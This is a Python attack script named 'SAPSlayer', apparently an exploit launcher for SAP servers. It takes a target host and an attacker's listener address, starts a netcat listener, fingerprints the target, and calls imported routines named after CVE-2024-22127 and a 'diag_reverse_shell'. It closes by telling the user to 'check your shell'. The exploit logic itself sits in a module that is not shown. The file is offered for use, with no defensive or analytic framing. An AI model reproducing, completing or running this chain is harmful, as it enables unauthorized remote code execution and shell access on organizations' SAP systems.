#!/usr/bin/env python3
import argparse, os
from colorama import Fore, init
init(autoreset=True)

print(Fore.GREEN + r"""
███████╗ █████╗ ██████╗ ███████╗██╗      █████╗ ██╗   ██╗███████╗██████╗ 
██╔════╝██╔══██╗██╔══██╗██╔════╝██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗
███████╗███████║██████╔╝███████╗██║     ███████║ ╚████╔╝ █████╗  ██████╔╝
╚════██║██╔══██║██╔═══╝ ╚════██║██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗
███████║██║  ██║██║     ███████║███████╗██║  ██║   ██║   ███████╗██║  ██║
╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
                          SAP RCE Auto-Chain 2024-2025
                                    by mylo – 2025
""")

parser = argparse.ArgumentParser()
parser.add_argument("--host", required=True)
parser.add_argument("--port", type=int, default=3300)
parser.add_argument("--sysnr", default="00")
parser.add_argument("--lhost", required=True)
parser.add_argument("--lport", type=int, default=4444)
args = parser.parse_args()

print(f"{Fore.CYAN}[+] SAP Host → {args.host}:{args.port}{args.sysnr}")
print(f"{Fore.CYAN}[+] LHOST    → {args.lhost}:{args.lport}\n")

os.system(f"nc -lvnp {args.lport} > /dev/null 2>&1 &")

from modules.sap_rce import fingerprint, cve_2024_22127, diag_reverse_shell

if fingerprint(args.host, args.port):
    cve_2024_22127(args.host, args.port, args.sysnr, args.lhost, args.lport)
diag_reverse_shell(args.host, args.port, args.lhost, args.lport)

print(f"\n{Fore.RED}[+] SAPSlayer completed – check your shell!{Fore.RESET}")
